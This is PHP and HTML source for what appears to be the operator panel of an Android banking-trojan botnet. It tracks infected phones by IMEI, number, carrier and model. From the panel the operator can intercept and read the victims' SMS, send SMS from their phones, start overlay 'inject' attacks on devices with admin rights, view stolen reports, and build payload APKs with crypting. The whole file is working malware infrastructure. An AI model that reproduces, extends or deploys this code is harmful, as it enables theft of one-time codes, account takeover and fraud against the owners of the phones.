<?

include_once("config.php");

if(!isset($_COOKIE[$coockies]) || ($_COOKIE[$coockies] != $admin_pass))
{
die(header("Location: ".$loginhtml));
}

$link = mysql_connect($mysql_host, $mysql_user, $mysql_pwd);
if (!$link) {
	echo "Error MySQL connect";
    die();
}

mysql_select_db($mysql_db) || die(mysql_close($link));

$row = mysql_fetch_array(mysql_query("select count(*) as howmany from stata"));
$number_of_rows = $row["howmany"]; 

$prefix = array();
$imeis = array();
$phones = array();
$opsoss = array();
$models = array();
$versdks = array();
$lasttime = array();
$smsdefs = array();
$admins = array();
$captured = array();
$countrys = array();
$restarts = array();

$q = "SELECT * FROM stata order by tektime desc";
$r = mysql_query($q);
 
if (mysql_num_rows($r) > 0) {
    while ($l = mysql_fetch_array($r)) {
        $prefix[] = $l['pefixa'];
        $imeis[] = $l['imei'];
        $phones[] = $l['phone'];
        $opsoss[] = $l['opsos'];
		$models[] = $l['model'];
        $versdks[] = $l['versdk'];
		$smsdefs[] = $l['smsdef'];
		$admins[] = $l['isadmin'];
        $lasttime[] = $l['tektime'];
		$restarts[] = $l['restarts'];
        $captured[] = $l['carta'];
		$countrys[] = $l['country'];
		}
}

mysql_close($link);

$ttime = time();
$online = 0;
foreach ($lasttime as $ltime) {
	if(ceil(($ttime - $ltime) / 60) < 3) {
		$online++;
	}
}

$m = 0;
$cc =0;
foreach ($captured as $acc) {
	if ($acc == 1) {
		$captprefix[$cc] = $prefix[$m];
		$captimeis[$cc] = $imeis[$m];
		$captphones[$cc] = $phones[$m];
		$captopsoss[$cc] = $opsoss[$m];
		$captmodels[$cc] = $models[$m];
		$captversdks[$cc] = $versdks[$m];
		$captsmsdefs[$cc] = $smsdefs[$m];
		$captadmins[$cc] = $admins[$m];
		$captlasttime[$cc] = $lasttime[$m];
		$capcountrys[] = $countrys[$m];
		$cc ++;
		}
		$m++;
}

?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Abrvall</title>
  <link rel="stylesheet" href="jquery-ui-1.11.4.custom/jquery-ui.css">
  <script src="jquery-ui-1.11.4.custom/external/jquery/jquery.js"></script>
  <script src="jquery-ui-1.11.4.custom/jquery-ui.js"></script>
<style>
body {
    font: 80% "Trebuchet MS", sans-serif;
}
table {
	background: #111;
}
th {
	background: #111;
	color: #f9f9f9;
	padding-left: 10px;
	padding-right: 10px;
	padding-top: 4px;
	padding-bottom: 4px;
	font-weight: normal;
	font-family: Verdana,Arial,sans-serif;
	font-size: 1.1em;
}
td {
	background: #f9f9f9;
	padding-left: 10px;
	padding-right: 10px;
	padding-top: 4px;
	padding-bottom: 4px;
	text-align: center;
}
</style>
<script>

function b64EncodeUnicode(str) {
    return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
        return String.fromCharCode('0x' + p1);
    }));
}

$(function() {

$("#responsecontainer").load("refreshadmin.php");
var refreshId = setInterval(function() {
$("#responsecontainer").load('refreshadmin.php');
}, 5000);
$.ajaxSetup({ cache: false });

$( "#tabs" ).tabs();

$( "#notepad" ).on( "click", function() {
		$( "#dialog8" ).dialog({
		autoOpen: true,
		width: 600,
		buttons: [
		{
		    text: "Save",
			click: function() {
				var text = $("#textnote").val();
				$('body').append('<form id="noteForm" action="notepad.php" method="post"><input type="hidden" name="text" value="' + b64EncodeUnicode(text) + '"></form>');
				$('#noteForm').submit();
			}
		},
		{
		    text: "Close",
			click: function() {
				$( this ).dialog( "close" );
			}
		}
		]
	});
});

$( "#clear" ).on( "click", function() {
$( "#dialog0" ).dialog({
	autoOpen: true,
	width: 400,
	buttons: [
		{
			text: "Ok",
			click: function() {
				$( this ).dialog( "close" );
				window.location.replace("cler.php");
			}
		},
		{
			text: "Cancel",
			click: function() {
				$( this ).dialog( "close" );
			}
		}
	]
});
});

$( "#apkb" ).on( "click", function() {
	$( "#frameapk" ).load("autocrypt/builder.php");
	$( "#dialog1" ).dialog({
		autoOpen: true,
		width: 600,
		buttons: [
		{
		    text: "Close",
			click: function() {
				$( this ).dialog( "close" );
			}
		}
		]
	});
});

$( "#tabs1" ).on( "click", function() {
	window.location.replace("<?=$adminphp?>#captured");
});	

$( "#tabs2" ).on( "click", function() {
	window.location.replace("<?=$adminphp?>#bots");
});	

});

function comment(uniqid) {
	$( "#dialog2" ).dialog({
		autoOpen: true,
		width: 600,
		buttons: [
		{
		    text: "Save",
			click: function() {
				var text = $("#textcom").val();
				$('body').append('<form id="commentForm" action="comment.php" method="post"><input type="hidden" name="id" value="' + uniqid + '"><input type="hidden" name="text" value="' + b64EncodeUnicode(text) + '"></form>');
				$('#commentForm').submit();
			}
		},
		{
		    text: "Close",
			click: function() {
				$( this ).dialog( "close" );
			}
		}
		]
	});
}

function rcomment(uniqid, comment) {
	$("#rtextcom").val(window.atob(comment));
	$( "#dialog3" ).dialog({
		autoOpen: true,
		width: 600,
		buttons: [
		{
		    text: "Save",
			click: function() {
				var text = $("#rtextcom").val();
				$('body').append('<form id="rcommentForm" action="comment.php" method="post"><input type="hidden" name="id" value="' + uniqid + '"><input type="hidden" name="text" value="' + b64EncodeUnicode(text) + '"></form>');
				$('#rcommentForm').submit();
			}
		},
		{
		    text: "Close",
			click: function() {
				$( this ).dialog( "close" );
			}
		}
		]
	});
}

function writephone(uniqid) {
	$( "#dialog4" ).dialog({
		autoOpen: true,
		width: 230,
		buttons: [
		{
		    text: "Save",
			click: function() {
				var text = $("#phnumb").val();
				$('body').append('<form id="phoneForm" action="savephone.php" method="post"><input type="hidden" name="id" value="' + uniqid + '"><input type="hidden" name="phone" value="' + text + '"></form>');
				$('#phoneForm').submit();
			}
		},
		{
		    text: "Close",
			click: function() {
				$( this ).dialog( "close" );
			}
		}
		]
	});
}

function smshis(uniqid, address) {
	$('body').append('<form id="histForm" action="needsmslist.php" method="post"><input type="hidden" name="id" value="' + uniqid + '"><input type="hidden" name="address" value="' + address + '"></form>');
	$('#histForm').submit();
}

function reports(uniqid) {
	$( "#framerep" ).load("report.php?id=" + uniqid);
	$( "#dialog5" ).dialog({
		autoOpen: true,
		width: 1200,
		buttons: [
		{
		    text: "Close",
			click: function() {
				$( this ).dialog( "close" );
			}
		}
		]		
	});	
}

function smssend(uniqid) {
	$( "#dialog6" ).dialog({
		autoOpen: true,
		width: 400,
		buttons: [
		{
		    text: "Send",
			click: function() {
				var phonenum = $("#phonenumb").val();
				var smsbody = $("#smsbody").val();
				$('body').append('<form id="sendsmsForm" action="sendsms.php" method="post"><input type="hidden" name="id" value="' + uniqid + '"><input type="hidden" name="phone" value="' + phonenum + '"><input type="hidden" name="message" value="' + smsbody + '"></form>');
				$('#sendsmsForm').submit();
			}
		},
		{
		    text: "Close",
			click: function() {
				$( this ).dialog( "close" );
			}
		}
		]
	});
}

function smsgrabs(uniqid, address) {
	$('body').append('<form id="grabForm" action="smsgrab.php" method="post"><input type="hidden" name="id" value="' + uniqid + '"><input type="hidden" name="address" value="' + address + '"></form>');
	$('#grabForm').submit();
}

function delimei(uniqid, address) {
$( "#dialog7" ).dialog({
	autoOpen: true,
	width: 400,
	title: "Delete bot with IMEI " + uniqid + "?",
	buttons: [
		{
			text: "Ok",
			click: function() {
				$( this ).dialog( "close" );
				$('body').append('<form id="delimeiForm" action="delete.php" method="post"><input type="hidden" name="id" value="' + uniqid + '"><input type="hidden" name="address" value="' + address + '"></form>');
	            $('#delimeiForm').submit();
			}
		},
		{
			text: "Cancel",
			click: function() {
				$( this ).dialog( "close" );
			}
		}
	]
});
}

function sinject(uniqid, address) {
	$('body').append('<form id="sjniForm" action="sinject.php" method="post"><input type="hidden" name="id" value="' + uniqid + '"><input type="hidden" name="address" value="' + address + '"></form>');
	$('#sjniForm').submit();
}

function imeidialog(uniqid, address) {
	$( "#dialog9" ).dialog({
		autoOpen: true,
		width: 400,
			buttons: [
			{
				text: "Close",
				click: function() {
				$( this ).dialog( "close" );
			}
		}
	]
	});	
}

</script>
</head>
<body>

<div id="dialog0" title="To clear statistics?" style="display: none;">
	<p>Are you sure?</p>
</div>

<div id="dialog1" title="APK Builder" style="display: none;">
	<div id="frameapk"></div>
</div>

<div id="dialog2" title="Comment" style="display: none;">
	<textarea id="textcom" style="width:100%;height:100%;top:0;left:0;right:0;bottom:0;"></textarea>
</div>

<div id="dialog3" title="Comment" style="display: none;">
	<textarea id="rtextcom" style="width:100%;height:100%;top:0;left:0;right:0;bottom:0;"></textarea>
</div>

<div id="dialog4" title="Phone Number" style="display: none;">
	<input type="text" id="phnumb" name="phone" autocomplete="off" maxlength="15">
</div>

<div id="dialog5" title="Reports" style="display: none;">
    <div id="framerep"></div>
</div>

<div id="dialog6" title="SMS Sender" style="display: none;">
    <label for="phonenumb" style="padding-top: 0px;">To:</label>
    <input type="text" id="phonenumb" name="phone" autocomplete="off" maxlength="12" style="width:100%;height:100%;top:0;left:0;right:0;bottom:0;">
	<label for="smsbody" style="padding-top: 0px;">Message:</label>
	<textarea id="smsbody" style="width:100%;height:100%;top:0;left:0;right:0;bottom:0;"></textarea>
</div>

<div id="dialog7" title="Delete this bot?" style="display: none;">
	<p>Are you sure?</p>
</div>

<div id="dialog8" title="Notepad" style="display: none;">
    <textarea id="textnote" style="width:100%;height:100%;top:0;left:0;right:0;bottom:0;"><?=base64_decode(file_get_contents('notepad/comment'))?></textarea>
</div>

<div id="tabs">
<ul>
    <li id="tabs2"><a href="#bots">Bots</a></li>
	<li id="tabs1"><a href="#captured">Captured</a></li>

	<button id="clear" role="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" id="button" style="float: right;"><span class="ui-button-text">Clean&nbsp;Stats</span></button>
	
	<a href="refrinject.php"><button id="inject" role="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" id="button" style="float: right;"><span class="ui-button-text">Refresh&nbsp;Inject</span></button></a>
	
	<button id="apkb" role="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" id="button" style="float: right;"><span class="ui-button-text">APK&nbsp;Builder</span></button>
    
	<button id="notepad" role="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" id="button" style="float: right;"><span class="ui-button-text">Notepad</span></button>
	
	<div id="responsecontainer" style="font-family: Verdana,Arial,sans-serif; font-size: 1.1em; padding-top: 0.4em; color: #f9f9f9; font-weight: normal;"></div>
</ul>

<div id="captured" style="padding-top:0.2em;">
<p>
<table cellspacing="1" width="100%">
<tr>
<th>№</th>
<th>Prefix</th>
<th>IMEI</th>
<th>Phone</th>
<th>Country</th>
<th>SDK</th>
<th>Status</th>
<th>SMS Sender</th>
<th>SMS Grabbing</th>
<th>SMS History</th>
<th>Inject</th>
<th>Reports</th>
<th>Comment</th>
</tr>
<?

$capstranic = ceil($cc / $kolvo);
if (($capstranic * $kolvo) >= $cc) {
	$allcapstr = $capstranic;
} else {
	$allcapstr = $capstranic + 1;
}

if(isset($_GET["str"])) {
	
	if($_GET["str"] > $allcapstr) {
		$numcapstr = $allcapstr;
	} elseif ($_GET["str"] < 1) {
		$numcapstr = 1;
	} else {
		$numcapstr = $_GET["str"];
	}
	
	$nach = $kolvo * ($numcapstr - 1);
	$kon = $kolvo * $numcapstr;
	if ($numcapstr == $allcapstr) {
		$kon = $cc;
	}
} else {
	if($cc >= $kolvo) {
		$nach = 0;
		$kon = $kolvo;
	} else {
		$nach = 0;
		$kon = $cc;
	}
}

for($j = $nach; $j < $kon; $j++) {
?>
<tr>
<td><?=$j+1?>&nbsp;</td>

<td><?=$captprefix[$j]?></td>

<td style="cursor:pointer; color: #cb4b16;" onclick="javascript:delimei('<?=$captimeis[$j]?>', '#captured');">
<?=$captimeis[$j]?>
</td>

<?
if(!empty($captphones[$j])) {
?>
<td><?=$captphones[$j]?></td>
<?
} elseif ($captversdks[$j] < 19) {
?>
<td>Unknown</td>
<?
} else {
if($captsmsdefs[$j] == "com.android.mms") {
?>
<td style="cursor:pointer; color: #859900;" onclick="javascript:writephone('<?=$captimeis[$j]?>');"><b>Write</b></td>
<?
} else {
?>
<td>&nbsp;</td>
<?
}
}
?>
<td><?=$capcountrys[$j]?></td>
<td><?=$captversdks[$j]?></td>

<?
if((($ttime - $captlasttime[$j]) / 60) < 3) {
?>
<td style="color: #6c71c4;">Online</td>
<?
} else {
?>
<td>Offline</td>
<?
}
?>

<td style="cursor:pointer; color: #859900;" onclick="javascript:smssend('<?=$captimeis[$j]?>');"><b>Write</b></td>
<?
if((!empty($captphones[$j])) && (($captsmsdefs[$j] == "com.android.mms") || ($captversdks[$j] < 19))) {
if(is_file("temp/grab".$captimeis[$j])) {
?>
<td style="cursor:pointer; color: #cb4b16;" onclick="javascript:smsgrabs('<?=$captimeis[$j]?>', '#captured');"><b>Stop</b></td>
<?
} else {
?>
<td style="cursor:pointer; color: #859900;" onclick="javascript:smsgrabs('<?=$captimeis[$j]?>', '#captured');"><b>Start</b></td>
<?
}
} elseif(empty($captphones[$j]) && ($captversdks[$j] < 19)) {
if(is_file("temp/grab".$captimeis[$j])) {
?>
<td style="cursor:pointer; color: #cb4b16;" onclick="javascript:smsgrabs('<?=$captimeis[$j]?>', '#captured');"><b>Stop</b></td>
<?
} else {
?>
<td style="cursor:pointer; color: #859900;" onclick="javascript:smsgrabs('<?=$captimeis[$j]?>', '#captured');"><b>Start</b></td>
<?
}
} else {
?>
<td>&nbsp;</td>
<?
}
if(is_file("temp/waitsmslist".$captimeis[$j])) {
?>
<td style="color: #2aa198;">Wait...</td>
<?
} else {
?>
<td style="cursor:pointer; color: #859900;" onclick="javascript:smshis('<?=$captimeis[$j]?>', '#captured');"><b>Receive</b></td>
<?
}


if($captadmins[$j] == 1) {

if(is_file("temp/needinject".$captimeis[$j])) {
?>
<td style="cursor:pointer; color: #cb4b16;" onclick="javascript:sinject('<?=$captimeis[$j]?>', '#captured');"><b>Stop</b></td>
<?
} else {
?>
<td style="cursor:pointer; color: #859900;" onclick="javascript:sinject('<?=$captimeis[$j]?>', '#captured');"><b>Start</b></td>
<?	
}

} else {
?>
<td>&nbsp;</td>
<?
}

if(is_file("temp/grabbed".$captimeis[$j]) || is_file("temp/messages".$captimeis[$j]) || is_file("temp/sended".$captimeis[$j]) || is_file("temp/apps".$captimeis[$j])) {
?>
<td style="cursor:pointer;" onclick="javascript:reports('<?=$captimeis[$j]?>');"><font color='#002b36;'><b>Read</b></font></td>
<?
} else {
?>
<td>&nbsp;</td>
<?
}
if(is_file("temp/comment".$captimeis[$j])) {
	$rcomment = file_get_contents("temp/comment".$captimeis[$j]);
?>
<td style="cursor:pointer;" onclick="javascript:rcomment('<?=$captimeis[$j]?>', '<?=$rcomment?>');"><font color='#002b36;'><b>Read</b></font></td>
<?
} else {
?>
<td style="cursor:pointer; color: #859900;" onclick="javascript:comment('<?=$captimeis[$j]?>');"><b>Write</b></td>
<?
}
?>
</tr>
<?
}
?>
</table>
</p>
<p>
<?
for($k = 1; $k <= $allcapstr; $k++) {
?>
<a href="<?=$adminphp?>?str=<?=$k?>#captured"><?=$k?></a>&nbsp;
<?
}
?>
</p>
</div>
<div id="bots" style="padding-top:0.2em;">
<p>
<table cellspacing="1" width="100%">
<tr>
<th>№</th>
<th>Prefix</th>
<th>IMEI</th>
<th>Phone</th>
<th>Country</th>
<th>Operator</th>
<th>Model</th>
<th>SDK</th>
<th>Reports</th>
<th>Status</th>
<th>Restart</th>
<th>SMS-Client</th>
<th>SMS-Grabbing</th>
<th>Admin</th>
<th>Inject</th>
</tr>
<?

$stranic = ceil($number_of_rows / $kolvo);
if (($stranic * $kolvo) >= $number_of_rows) {
	$allstr = $stranic;
} else {
	$allstr = $stranic + 1;
}

if(isset($_GET["str"])) {

	if($_GET["str"] > $allstr) {
		$numstr = $allstr;
	} elseif ($_GET["str"] < 1) {
		$numstr = 1;
	} else {
		$numstr = $_GET["str"];
	}
	
	$nach = $kolvo * ($numstr - 1);
	$kon = $kolvo * $numstr;
	if ($numstr == $allstr) {
		$kon = $number_of_rows;
	}
} else {
	if($number_of_rows >= $kolvo) {
		$nach = 0;
		$kon = $kolvo;
	} else {
		$nach = 0;
		$kon = $number_of_rows;
	}
}

for($j = $nach; $j < $kon; $j++) {
?>
<tr>
<td><?=$j+1?></td>
<td><?=$prefix[$j]?></td>
<td style="cursor:pointer; color: #cb4b16;" onclick="javascript:imeidialog('<?=$imeis[$j]?>', '#bots');">
<?=$imeis[$j]?>
<div id="dialog9" title="Commands" style="display: none;">
	<p><button role="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" id="button" style="float: left; width: 100%;" onclick="javascript:smshis('<?=$imeis[$j]?>', '#bots');"><span class="ui-button-text">Receive&nbsp;SMS&nbsp;History</span></button></p>
	<br>
	<p><button role="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" id="button" style="float: left; width: 100%;" onclick="javascript:smssend('<?=$imeis[$j]?>');"><span class="ui-button-text">Send&nbsp;SMS</span></button></p>
	<br>
	<p><button role="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" id="button" style="float: left; width: 100%;" onclick="javascript:delimei('<?=$imeis[$j]?>', '#bots');"><span class="ui-button-text">Delete</span></button></p>
</div>
</td>
<td><?=$phones[$j]?></td>
<td><?=$countrys[$j]?></td>
<td><?=$opsoss[$j]?></td>
<td><?=$models[$j]?></td>
<td><?=$versdks[$j]?></td>

<?
if(is_file("temp/apps".$imeis[$j])) {
?>
<td style="cursor:pointer;" onclick="javascript:reports('<?=$imeis[$j]?>');"><font color='#002b36;'><b>Read</b></font></td>
<?	
} else {
?>
<td>&nbsp;</td>
<?
}

if((($ttime - $lasttime[$j]) / 60) < 3) {
?>
<td style="color: #6c71c4;">Online</td>
<?
} else {
?>
<td>Offline</td>
<?
}
?>

<td><?=$restarts[$j]?></td>
<td><?=$smsdefs[$j]?></td>
<?
if((!empty($phones[$j])) && ($smsdefs[$j] == "com.android.mms")) {
if(is_file("temp/grab".$imeis[$j])) {
?>
<td style="cursor:pointer; color: #cb4b16;" onclick="javascript:smsgrabs('<?=$imeis[$j]?>', '#bots');"><b>Stop</b></td>
<?
} else {
?>
<td style="cursor:pointer;" onclick="javascript:smsgrabs('<?=$imeis[$j]?>', '#bots');"><font color='#859900;'><b>Start</b></font></td>
<?
}
} elseif($versdks[$j] < 19) {
if(is_file("temp/grab".$imeis[$j])) {
?>
<td style="cursor:pointer; color: #cb4b16;" onclick="javascript:smsgrabs('<?=$imeis[$j]?>', '#bots');"><b>Stop</b></td>
<?
} else {
?>
<td style="cursor:pointer;" onclick="javascript:smsgrabs('<?=$imeis[$j]?>', '#bots');"><font color='#859900;'><b>Start</b></font></td>
<?
}
} else {
?>
<td>&nbsp;</td>
<?
}
if($admins[$j] == 0) {
?>
<td>No</td>
<?
} else {
?>
<td>Yes</td>
<?
}
if($admins[$j] == 1) {

if(is_file("temp/needinject".$imeis[$j])) {
?>
<td style="cursor:pointer; color: #cb4b16;" onclick="javascript:sinject('<?=$imeis[$j]?>', '#bots');"><b>Stop</b></td>
<?
} else {
?>
<td style="cursor:pointer; color: #859900;" onclick="javascript:sinject('<?=$imeis[$j]?>', '#bots');"><b>Start</b></td>
<?	
}

} else {
?>
<td>&nbsp;</td>
<?
}
?>
</tr>	
<?
}
?>
</table>
</p>
<p>
<?
for($k = 1; $k <= $allstr; $k++) {
?>
<a href="<?=$adminphp?>?str=<?=$k?>#bots"><?=$k?></a>&nbsp;
<?
}
?>
</p>
</div>

</div>

</body>
</html>